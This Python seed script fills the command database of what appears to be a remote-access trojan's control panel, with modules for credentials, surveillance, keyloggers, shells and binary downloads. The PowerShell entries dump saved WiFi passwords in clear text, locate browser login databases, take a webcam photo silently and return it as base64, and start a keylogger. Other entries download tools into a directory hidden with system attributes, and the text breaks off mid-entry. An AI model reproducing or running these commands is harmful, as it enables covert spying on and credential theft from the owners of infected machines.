"""
Complete seed script for all Module Control Panel categories
این اسکریپت تمام دسته‌بندی‌ها، بخش‌ها و ماژول‌ها را اضافه می‌کند
"""

import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from api.services.database import Database
from datetime import datetime
import uuid
import asyncio

# Initialize database
db = Database()

# Timestamp
now = datetime.now().isoformat()

# Define complete seed data
COMPLETE_SEED_DATA = {
    "categories": [
        {
            "id": "cat-system",
            "name": "system",
            "label": "System",
            "icon": "fas fa-desktop",
            "order_index": 0,
            "is_active": 1,
            "is_default": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-file",
            "name": "file",
            "label": "File Manager",
            "icon": "fas fa-folder",
            "order_index": 1,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-process",
            "name": "process",
            "label": "Process Manager",
            "icon": "fas fa-tasks",
            "order_index": 2,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-network",
            "name": "network",
            "label": "Network",
            "icon": "fas fa-network-wired",
            "order_index": 3,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-registry",
            "name": "registry",
            "label": "Registry",
            "icon": "fas fa-database",
            "order_index": 4,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-remote",
            "name": "remote",
            "label": "Remote Desktop",
            "icon": "fas fa-desktop",
            "order_index": 5,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-ttyd",
            "name": "ttyd",
            "label": "ttyd Terminal",
            "icon": "fas fa-terminal",
            "order_index": 6,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-credential",
            "name": "credential",
            "label": "Credentials",
            "icon": "fas fa-key",
            "order_index": 7,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-surveillance",
            "name": "surveillance",
            "label": "Surveillance",
            "icon": "fas fa-camera",
            "order_index": 8,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-keylogger",
            "name": "keylogger",
            "label": "Keylogger",
            "icon": "fas fa-keyboard",
            "order_index": 9,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-shell",
            "name": "shell",
            "label": "Shell",
            "icon": "fas fa-terminal",
            "order_index": 10,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-misc",
            "name": "misc",
            "label": "Misc",
            "icon": "fas fa-cog",
            "order_index": 11,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "cat-binary",
            "name": "binary",
            "label": "Binary",
            "icon": "fas fa-download",
            "order_index": 12,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        }
    ],
    
    "sections": [
        # System Category
        {
            "id": "sec-sys-info",
            "category_id": "cat-system",
            "name": "system_information",
            "label": "System Information",
            "icon": "fas fa-info-circle",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "sec-sys-security",
            "category_id": "cat-system",
            "name": "security_permissions",
            "label": "Security & Permissions",
            "icon": "fas fa-shield-alt",
            "order_index": 1,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Process Category
        {
            "id": "sec-proc-mgmt",
            "category_id": "cat-process",
            "name": "process_management",
            "label": "Process Management",
            "icon": "fas fa-list",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "sec-proc-control",
            "category_id": "cat-process",
            "name": "process_control",
            "label": "Process Control",
            "icon": "fas fa-sliders-h",
            "order_index": 1,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Network Category
        {
            "id": "sec-net-info",
            "category_id": "cat-network",
            "name": "network_information",
            "label": "Network Information",
            "icon": "fas fa-info-circle",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "sec-net-tools",
            "category_id": "cat-network",
            "name": "network_tools",
            "label": "Network Tools",
            "icon": "fas fa-tools",
            "order_index": 1,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Registry Category
        {
            "id": "sec-reg-ops",
            "category_id": "cat-registry",
            "name": "registry_operations",
            "label": "Registry Operations",
            "icon": "fas fa-database",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Credential Category
        {
            "id": "sec-cred-browser",
            "category_id": "cat-credential",
            "name": "browser_credentials",
            "label": "Browser Credentials",
            "icon": "fas fa-globe",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "sec-cred-network",
            "category_id": "cat-credential",
            "name": "network_credentials",
            "label": "Network Credentials",
            "icon": "fas fa-wifi",
            "order_index": 1,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "sec-cred-windows",
            "category_id": "cat-credential",
            "name": "windows_credentials",
            "label": "Windows Credentials",
            "icon": "fas fa-key",
            "order_index": 2,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "sec-cred-apps",
            "category_id": "cat-credential",
            "name": "application_credentials",
            "label": "Application Credentials",
            "icon": "fas fa-file-alt",
            "order_index": 3,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Surveillance Category
        {
            "id": "sec-surv-capture",
            "category_id": "cat-surveillance",
            "name": "surveillance_capture",
            "label": "Surveillance",
            "icon": "fas fa-camera",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Keylogger Category
        {
            "id": "sec-key-ops",
            "category_id": "cat-keylogger",
            "name": "keylogger_operations",
            "label": "Keylogger",
            "icon": "fas fa-keyboard",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Misc Category
        {
            "id": "sec-misc-ops",
            "category_id": "cat-misc",
            "name": "miscellaneous",
            "label": "Miscellaneous",
            "icon": "fas fa-cog",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        },
        
        # Binary Category
        {
            "id": "sec-binary-mgmt",
            "category_id": "cat-binary",
            "name": "binary_management",
            "label": "Binary Management",
            "icon": "fas fa-box",
            "order_index": 0,
            "is_active": 1,
            "created_at": now,
            "updated_at": now
        }
    ],
    
    "items": [
        # System Information Items
        {
            "id": "item-sys-info-basic",
            "section_id": "sec-sys-info",
            "name": "get_system_info",
            "label": "Get System Info",
            "icon": "fas fa-server",
            "command": "systeminfo",
            "execution_type": "cmd",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display detailed configuration information",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-info-user",
            "section_id": "sec-sys-info",
            "name": "current_user_info",
            "label": "Current User Info",
            "icon": "fas fa-user",
            "command": "whoami /all",
            "execution_type": "cmd",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display current user information",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-info-os",
            "section_id": "sec-sys-info",
            "name": "os_details",
            "label": "OS Details",
            "icon": "fas fa-window-maximize",
            "command": "wmic os get *",
            "execution_type": "cmd",
            "order_index": 2,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Get detailed OS information",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-info-cpu",
            "section_id": "sec-sys-info",
            "name": "cpu_information",
            "label": "CPU Information",
            "icon": "fas fa-microchip",
            "command": "wmic cpu get *",
            "execution_type": "cmd",
            "order_index": 3,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Get CPU information",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-info-memory",
            "section_id": "sec-sys-info",
            "name": "memory_information",
            "label": "Memory Information",
            "icon": "fas fa-memory",
            "command": "wmic memorychip get *",
            "execution_type": "cmd",
            "order_index": 4,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Get memory information",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-info-disk",
            "section_id": "sec-sys-info",
            "name": "disk_information",
            "label": "Disk Information",
            "icon": "fas fa-hdd",
            "command": "wmic diskdrive get *",
            "execution_type": "cmd",
            "order_index": 5,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Get disk information",
            "created_at": now,
            "updated_at": now
        },
        
        # Security & Permissions Items
        {
            "id": "item-sys-sec-priv",
            "section_id": "sec-sys-security",
            "name": "check_privileges",
            "label": "Check Privileges",
            "icon": "fas fa-user-shield",
            "command": "whoami /priv",
            "execution_type": "cmd",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display current user privileges",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-sec-users",
            "section_id": "sec-sys-security",
            "name": "list_users",
            "label": "List Users",
            "icon": "fas fa-users",
            "command": "net user",
            "execution_type": "cmd",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "List all user accounts",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-sec-admins",
            "section_id": "sec-sys-security",
            "name": "administrators_group",
            "label": "Administrators Group",
            "icon": "fas fa-crown",
            "command": "net localgroup administrators",
            "execution_type": "cmd",
            "order_index": 2,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display Administrators group members",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-sys-sec-gpresult",
            "section_id": "sec-sys-security",
            "name": "group_policy",
            "label": "Group Policy",
            "icon": "fas fa-list-alt",
            "command": "gpresult /r",
            "execution_type": "cmd",
            "order_index": 3,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display group policy information",
            "created_at": now,
            "updated_at": now
        },
        
        # Process Management Items
        {
            "id": "item-proc-list",
            "section_id": "sec-proc-mgmt",
            "name": "list_processes",
            "label": "List All Processes",
            "icon": "fas fa-list",
            "command": "tasklist /v",
            "execution_type": "cmd",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "List all running processes",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-proc-detailed",
            "section_id": "sec-proc-mgmt",
            "name": "detailed_process_info",
            "label": "Detailed Process Info",
            "icon": "fas fa-info-circle",
            "command": "wmic process get *",
            "execution_type": "cmd",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Get detailed process information",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-proc-services",
            "section_id": "sec-proc-mgmt",
            "name": "processes_with_services",
            "label": "Processes with Services",
            "icon": "fas fa-cogs",
            "command": "tasklist /svc",
            "execution_type": "cmd",
            "order_index": 2,
            "is_active": 1,
            "requires_admin": 0,
            "description": "List processes with services",
            "created_at": now,
            "updated_at": now
        },
        
        # Network Information Items
        {
            "id": "item-net-config",
            "section_id": "sec-net-info",
            "name": "network_configuration",
            "label": "Network Configuration",
            "icon": "fas fa-network-wired",
            "command": "ipconfig /all",
            "execution_type": "cmd",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display network configuration",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-net-connections",
            "section_id": "sec-net-info",
            "name": "active_connections",
            "label": "Active Connections",
            "icon": "fas fa-list",
            "command": "netstat -ano",
            "execution_type": "cmd",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display active connections",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-net-arp",
            "section_id": "sec-net-info",
            "name": "arp_table",
            "label": "ARP Table",
            "icon": "fas fa-table",
            "command": "arp -a",
            "execution_type": "cmd",
            "order_index": 2,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display ARP table",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-net-route",
            "section_id": "sec-net-info",
            "name": "routing_table",
            "label": "Routing Table",
            "icon": "fas fa-route",
            "command": "route print",
            "execution_type": "cmd",
            "order_index": 3,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Display routing table",
            "created_at": now,
            "updated_at": now
        },
        
        # Browser Credentials Items
        {
            "id": "item-cred-chrome",
            "section_id": "sec-cred-browser",
            "name": "chrome_passwords",
            "label": "Chrome Passwords",
            "icon": "fab fa-chrome",
            "command": '''$chromePath = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data"
if (Test-Path $chromePath) {
    Write-Host "[+] Chrome Login Data found"
    Write-Host "[*] Location: $chromePath"
    Write-Host "[!] Passwords are encrypted with DPAPI"
} else {
    Write-Host "[-] Chrome not found"
}''',
            "execution_type": "powershell",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Locate Chrome password database",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-cred-edge",
            "section_id": "sec-cred-browser",
            "name": "edge_passwords",
            "label": "Edge Passwords",
            "icon": "fab fa-edge",
            "command": '''$edgePath = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"
if (Test-Path $edgePath) {
    Write-Host "[+] Edge Login Data found"
    Write-Host "[*] Location: $edgePath"
    Write-Host "[!] Passwords are encrypted with DPAPI"
} else {
    Write-Host "[-] Edge not found"
}''',
            "execution_type": "powershell",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Locate Edge password database",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-cred-firefox",
            "section_id": "sec-cred-browser",
            "name": "firefox_passwords",
            "label": "Firefox Passwords",
            "icon": "fab fa-firefox",
            "command": '''$ffPath = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"
if (Test-Path $ffPath) {
    Write-Host "[+] Firefox profiles found"
    Get-ChildItem $ffPath -Directory | ForEach-Object {
        $loginsPath = Join-Path $_.FullName "logins.json"
        if (Test-Path $loginsPath) {
            Write-Host "[+] Profile: $($_.Name)"
            Write-Host "[*] Logins: $loginsPath"
        }
    }
} else {
    Write-Host "[-] Firefox not found"
}''',
            "execution_type": "powershell",
            "order_index": 2,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Locate Firefox password database",
            "created_at": now,
            "updated_at": now
        },
        
        # Network Credentials Items
        {
            "id": "item-cred-wifi",
            "section_id": "sec-cred-network",
            "name": "wifi_passwords",
            "label": "WiFi Passwords",
            "icon": "fas fa-wifi",
            "command": '''Write-Host "[+] Extracting WiFi Passwords..."
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
foreach ($profile in $profiles) {
    $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() }
    if ($password) {
        Write-Host "[+] $profile : $password"
    } else {
        Write-Host "[*] $profile : (Open Network)"
    }
}''',
            "execution_type": "powershell",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Extract WiFi passwords",
            "created_at": now,
            "updated_at": now
        },
        
        # Windows Credentials Items
        {
            "id": "item-cred-win-cmdkey",
            "section_id": "sec-cred-windows",
            "name": "credential_manager",
            "label": "Credential Manager",
            "icon": "fas fa-user-shield",
            "command": "cmdkey /list",
            "execution_type": "cmd",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "List Windows Credential Manager entries",
            "created_at": now,
            "updated_at": now
        },
        
        # Surveillance Items
        {
            "id": "item-surv-screenshot",
            "section_id": "sec-surv-capture",
            "name": "take_screenshot",
            "label": "Take Screenshot",
            "icon": "fas fa-camera",
            "command": "screenshot",
            "execution_type": "powershell",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Capture screenshot",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-surv-webcam",
            "section_id": "sec-surv-capture",
            "name": "capture_webcam",
            "label": "Capture Webcam Photo",
            "icon": "fas fa-video",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$ff="$bm\\ffmpeg\\bin\\ffmpeg.exe";if(-not(Test-Path $ff)){exit 1};$cam=Get-PnpDevice -Class Camera|Where-Object{$_.Status -eq 'OK'}|Select-Object -First 1;if(-not $cam){exit 1};$camName=$cam.FriendlyName;$out="$env:TEMP\\webcam_$(Get-Random).jpg";try{& $ff -f dshow -i video="$camName" -frames:v 1 $out -y 2>&1|Out-Null;if(Test-Path $out){$bytes=[System.IO.File]::ReadAllBytes($out);$b64=[System.Convert]::ToBase64String($bytes);Write-Host $b64;Remove-Item $out -Force}else{exit 1}}catch{exit 1;if(Test-Path $out){Remove-Item $out -Force}}''',
            "execution_type": "powershell",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Capture photo from webcam using FFmpeg and return as base64",
            "created_at": now,
            "updated_at": now
        },
        
        # Keylogger Items
        {
            "id": "item-key-start",
            "section_id": "sec-key-ops",
            "name": "start_keylogger",
            "label": "Start Keylogger",
            "icon": "fas fa-play",
            "command": "start_keylogger",
            "execution_type": "powershell",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Start keylogger",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-key-stop",
            "section_id": "sec-key-ops",
            "name": "stop_keylogger",
            "label": "Stop Keylogger",
            "icon": "fas fa-stop",
            "command": "stop_keylogger",
            "execution_type": "powershell",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Stop keylogger",
            "created_at": now,
            "updated_at": now
        },
        
        # Misc Items
        {
            "id": "item-misc-restart",
            "section_id": "sec-misc-ops",
            "name": "restart_system",
            "label": "Restart System",
            "icon": "fas fa-redo",
            "command": "shutdown /r /t 0",
            "execution_type": "cmd",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 1,
            "description": "Restart system immediately",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-misc-shutdown",
            "section_id": "sec-misc-ops",
            "name": "shutdown_system",
            "label": "Shutdown System",
            "icon": "fas fa-power-off",
            "command": "shutdown /s /t 0",
            "execution_type": "cmd",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 1,
            "description": "Shutdown system immediately",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-misc-logoff",
            "section_id": "sec-misc-ops",
            "name": "logoff_user",
            "label": "Logoff User",
            "icon": "fas fa-sign-out-alt",
            "command": "logoff",
            "execution_type": "cmd",
            "order_index": 2,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Logoff current user",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-misc-startup",
            "section_id": "sec-misc-ops",
            "name": "startup_programs",
            "label": "Startup Programs",
            "icon": "fas fa-rocket",
            "command": "wmic startup get *",
            "execution_type": "cmd",
            "order_index": 3,
            "is_active": 1,
            "requires_admin": 0,
            "description": "List startup programs",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-misc-services",
            "section_id": "sec-misc-ops",
            "name": "services",
            "label": "Services",
            "icon": "fas fa-cogs",
            "command": "wmic service get *",
            "execution_type": "cmd",
            "order_index": 4,
            "is_active": 1,
            "requires_admin": 0,
            "description": "List all services",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-misc-products",
            "section_id": "sec-misc-ops",
            "name": "installed_products",
            "label": "Installed Products",
            "icon": "fas fa-box",
            "command": "wmic product get *",
            "execution_type": "cmd",
            "order_index": 5,
            "is_active": 1,
            "requires_admin": 0,
            "description": "List installed products",
            "created_at": now,
            "updated_at": now
        },
        
        # Binary Management Items
        {
            "id": "item-binary-check-ffmpeg",
            "section_id": "sec-binary-mgmt",
            "name": "check_ffmpeg",
            "label": "Check FFmpeg",
            "icon": "fas fa-search",
            "command": '''$binaryModulePath = "$env:USERPROFILE\\binary_module"
$binaryPath = "$binaryModulePath\\ffmpeg\\bin\\ffmpeg.exe"
$systemCheck = Get-Command ffmpeg -ErrorAction SilentlyContinue

if ($systemCheck) {
    Write-Host "[+] FFmpeg found in system PATH: $($systemCheck.Source)"
} elseif (Test-Path $binaryPath) {
    Write-Host "[+] FFmpeg found in binary_module: $binaryPath"
} else {
    # Check for alternative paths (typos or old installations)
    $possiblePaths = @(
        "$binaryModulePath\\ffpmeg\\bin\\ffmpeg.exe",
        "$binaryModulePath\\ffmpeg-n8.0-latest-win64-lgpl-8.0\\bin\\ffmpeg.exe"
    )
    
    $found = $false
    foreach ($path in $possiblePaths) {
        if (Test-Path $path) {
            Write-Host "[+] FFmpeg found at: $path"
            Write-Host "[!] Note: This is not the standard location. Consider reinstalling."
            $found = $true
            break
        }
    }
    
    if (-not $found) {
        Write-Host "[-] FFmpeg not found"
        Write-Host "[*] Run 'Install FFmpeg' to install it"
    }
}''',
            "execution_type": "powershell",
            "order_index": 0,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Check if FFmpeg is installed on the system",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-install-ffmpeg",
            "section_id": "sec-binary-mgmt",
            "name": "install_ffmpeg",
            "label": "Install FFmpeg",
            "icon": "fas fa-download",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$fp="$bm\\ffmpeg";$zp="$bm\\ffmpeg.zip";$url="https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-n8.0-latest-win64-lgpl-8.0.zip";if(-not(Test-Path $bm)){New-Item -ItemType Directory -Path $bm -Force|Out-Null;Write-Host "[+] Created: $bm"};attrib +h +s +r "$bm"|Out-Null;$sc=Get-Command ffmpeg -EA SilentlyContinue;$fe="$fp\\bin\\ffmpeg.exe";if($sc){Write-Host "[!] Already in PATH: $($sc.Source)";exit 0};$pp=@($fe,"$bm\\ffpmeg\\bin\\ffmpeg.exe","$bm\\ffmpeg-n8.0-latest-win64-lgpl-8.0\\bin\\ffmpeg.exe");foreach($cp in $pp){if(Test-Path $cp){Write-Host "[!] Already installed: $cp";exit 0}}

Write-Host "[*] Downloading...";try{Start-BitsTransfer -Source $url -Destination $zp -EA Stop;Write-Host "[+] Downloaded"}catch{Write-Host "[-] Download failed: $_";exit 1};Write-Host "[*] Extracting...";try{$efn="ffmpeg-n8.0-latest-win64-lgpl-8.0";$ep="$bm\\$efn";$op=@($fp,$ep,"$bm\\ffpmeg");foreach($op1 in $op){if(Test-Path $op1){Remove-Item $op1 -Recurse -Force -EA SilentlyContinue}};Expand-Archive -Path $zp -DestinationPath $bm -Force;if(Test-Path $ep){Rename-Item -Path $ep -NewName "ffmpeg" -Force;Write-Host "[+] Extracted"}else{Write-Host "[-] Extract failed";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}}catch{Write-Host "[-] Extract error: $_";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1};if(Test-Path $fe){Write-Host "[+] Installed: $fe";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue}}else{Write-Host "[-] Verification failed";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}''',
            "execution_type": "powershell",
            "order_index": 1,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Download and install FFmpeg to binary_module directory",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-check-nircmd",
            "section_id": "sec-binary-mgmt",
            "name": "check_nircmd",
            "label": "Check NirCMD",
            "icon": "fas fa-search",
            "command": '''$binaryPath = "$env:USERPROFILE\\binary_module\\nircmd\\nircmd.exe"
$binaryPathAlt = "$env:USERPROFILE\\binary_module\\nircmd-x64\\nircmd.exe"
$systemCheck = Get-Command nircmd -ErrorAction SilentlyContinue
if ($systemCheck) {
    Write-Host "[+] NirCMD found in system PATH: $($systemCheck.Source)"
} elseif (Test-Path $binaryPath) {
    Write-Host "[+] NirCMD found in binary_module: $binaryPath"
} elseif (Test-Path $binaryPathAlt) {
    Write-Host "[+] NirCMD found in binary_module: $binaryPathAlt"
} else {
    Write-Host "[-] NirCMD not found"
    Write-Host "[*] Run 'Install NirCMD' to install it"
}''',
            "execution_type": "powershell",
            "order_index": 2,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Check if NirCMD is installed on the system",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-install-nircmd",
            "section_id": "sec-binary-mgmt",
            "name": "install_nircmd",
            "label": "Install NirCMD",
            "icon": "fas fa-download",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$np="$bm\\nircmd";$zp="$bm\\nircmd.zip";$url="https://www.nirsoft.net/utils/nircmd-x64.zip";if(-not(Test-Path $bm)){New-Item -ItemType Directory -Path $bm -Force|Out-Null;Write-Host "[+] Created: $bm"};attrib +h +s +r "$bm"|Out-Null;$ne="$np\\nircmd.exe";$na="$bm\\nircmd-x64\\nircmd.exe";if(Test-Path $ne){Write-Host "[!] Already installed: $ne";exit 0}elseif(Test-Path $na){Write-Host "[!] Already installed: $na";exit 0};Write-Host "[*] Downloading...";try{Start-BitsTransfer -Source $url -Destination $zp -EA Stop;Write-Host "[+] Downloaded"}catch{Write-Host "[-] Download failed: $_";exit 1};Write-Host "[*] Extracting...";try{if(Test-Path $np){Remove-Item $np -Recurse -Force};$tep="$bm\\temp_nircmd";if(Test-Path $tep){Remove-Item $tep -Recurse -Force};Expand-Archive -Path $zp -DestinationPath $tep -Force;$ef=Get-ChildItem -Path $tep -Directory|Select-Object -First 1;if($ef){Move-Item -Path $ef.FullName -Destination $np -Force;Remove-Item $tep -Force -EA SilentlyContinue}else{New-Item -ItemType Directory -Path $np -Force|Out-Null;Get-ChildItem -Path $tep|Move-Item -Destination $np -Force;Remove-Item $tep -Force};Write-Host "[+] Extracted"}catch{Write-Host "[-] Extract error: $_";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1};if(Test-Path $ne){Write-Host "[+] Installed: $ne";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue}}else{Write-Host "[-] Verification failed";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}''',
            "execution_type": "powershell",
            "order_index": 3,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Download and install NirCMD to binary_module directory",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-check-filebrowser",
            "section_id": "sec-binary-mgmt",
            "name": "check_filebrowser",
            "label": "Check FileBrowser",
            "icon": "fas fa-search",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$fbp="$bm\\filebrowser";$fbe="$fbp\\filebrowser.exe";$sc=Get-Command filebrowser -EA SilentlyContinue;if($sc){Write-Host "[+] FileBrowser found in PATH: $($sc.Source)"}elseif(Test-Path $fbe){Write-Host "[+] FileBrowser found: $fbe"}else{Write-Host "[-] FileBrowser not found";Write-Host "[*] Run 'Install FileBrowser' to install it"}''',
            "execution_type": "powershell",
            "order_index": 4,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Check if FileBrowser is installed on the system",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-install-filebrowser",
            "section_id": "sec-binary-mgmt",
            "name": "install_filebrowser",
            "label": "Install FileBrowser",
            "icon": "fas fa-download",
            "command": '''$bm="$env:USERPROFILE\\binary_module";$fbp="$bm\\filebrowser";$zp="$bm\\filebrowser.zip";$url="https://github.com/filebrowser/filebrowser/releases/download/v2.52.0/windows-amd64-filebrowser.zip";if(-not(Test-Path $bm)){New-Item -ItemType Directory -Path $bm -Force|Out-Null;Write-Host "[+] Created: $bm"};attrib +h +s +r "$bm"|Out-Null;$fbe="$fbp\\filebrowser.exe";if(Test-Path $fbe){Write-Host "[!] Already installed: $fbe";exit 0};Write-Host "[*] Downloading...";try{Start-BitsTransfer -Source $url -Destination $zp -EA Stop;Write-Host "[+] Downloaded"}catch{Write-Host "[-] Download failed: $_";exit 1};Write-Host "[*] Extracting...";try{if(Test-Path $fbp){Remove-Item $fbp -Recurse -Force};$tep="$bm\\temp_filebrowser";if(Test-Path $tep){Remove-Item $tep -Recurse -Force};Expand-Archive -Path $zp -DestinationPath $tep -Force;$fbf="$tep\\filebrowser.exe";if(Test-Path $fbf){New-Item -ItemType Directory -Path $fbp -Force|Out-Null;Move-Item -Path $fbf -Destination $fbe -Force;Remove-Item $tep -Recurse -Force;Write-Host "[+] Extracted"}else{Write-Host "[-] filebrowser.exe not found in archive";if(Test-Path $tep){Remove-Item $tep -Recurse -Force};if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}}catch{Write-Host "[-] Extract error: $_";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1};if(Test-Path $fbe){Write-Host "[+] Installed: $fbe";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue}}else{Write-Host "[-] Verification failed";if(Test-Path $zp){Remove-Item $zp -Force -EA SilentlyContinue};exit 1}''',
            "execution_type": "powershell",
            "order_index": 5,
            "is_active": 1,
            "requires_admin": 0,
            "description": "Download and install FileBrowser to binary_module directory",
            "created_at": now,
            "updated_at": now
        },
        {
            "id": "item-binary-check-shadowsocks",
            "section_id": "sec-binary-mgmt",
            "name": "check_shadowsocks",
            "label": "Check Shadowsocks",
            "icon": "fas fa-search",
